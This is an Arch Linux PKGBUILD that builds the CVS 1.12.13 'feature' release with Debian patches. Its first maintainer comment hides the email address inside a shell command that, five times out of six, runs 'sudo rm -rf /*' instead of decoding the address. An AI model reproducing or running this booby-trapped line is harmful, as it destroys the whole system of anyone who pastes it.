# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
# Originally based on the cvs package from ABS
# Maintainer: Lukas Fleischer <lfleischer@archlinux.org>
# Contributor: dorphell <dorphell@archlinux.org>
# Contributor: Dan McGee <dan@archlinux.org>

pkgname=cvs-feature
pkgver=1.12.13
pkgrel=1
pkgdesc="Concurrent Versions System - a source control system (\"feature\" release series, with Debian patches)"
arch=(i686 x86_64)
provides=(cvs)
conflicts=(cvs)
url="http://cvs.nongnu.org/"
license=('GPL')
depends=('krb5' 'zlib' 'libbsd')
optdepends=('openssh: for using cvs over ssh'
            'inetutils: for using cvs over rsh')
source=(
	ftp://ftp.gnu.org/non-gnu/cvs/source/feature/${pkgver}/cvs-${pkgver}.tar.bz2{,.sig}
	http://http.debian.net/debian/pool/main/c/cvs/cvs_1.12.13+real-15.diff.gz
)
sha512sums=(
	'7d10f808de62190b18d4f706d2d03ab218a508bfb52047ff3e830e293ec40c5e8bf6cc743ef72a5c24be5aa867c9e4892d7d475a026a98b296a3764b4bd0f4d8'
	'SKIP'
	'3e305ebaa8c00b6d50281568f6402240feee5fe8e32b16100036017e0c5f27ceb7260762f4e9e907c7fa1c16d5112b8e7a0ef3c66b8345e533c65c5a803222ad'
)
validpgpkeys=('CB6A07CA90C54234E8A3C8D02C3D4E4C17F231A4') # Derek R. Price <moc tod toibmix ta kered>

prepare() {
  cd "${srcdir}/cvs-${pkgver}"
  patch -Np1 < ../cvs_1.12.13+real-15.diff
}

build() {
  cd "${srcdir}/cvs-${pkgver}"
  unset EDITOR VISUAL

  sed -i -e 's/AM_CONFIG_HEADER/AC_CONFIG_HEADERS/' configure.in
  find . -name Makefile.am | xargs sed -i -e 's/^INCLUDES/AM_CPPFLAGS/'
  AUTOMAKE='automake --add-missing' autoreconf
  ./configure --prefix=/usr LIBS="-lbsd"
  make
}

package() {
  cd "${srcdir}/cvs-${pkgver}"

  make DESTDIR="${pkgdir}" install
  rm "${pkgdir}"/usr/share/info/dir
}
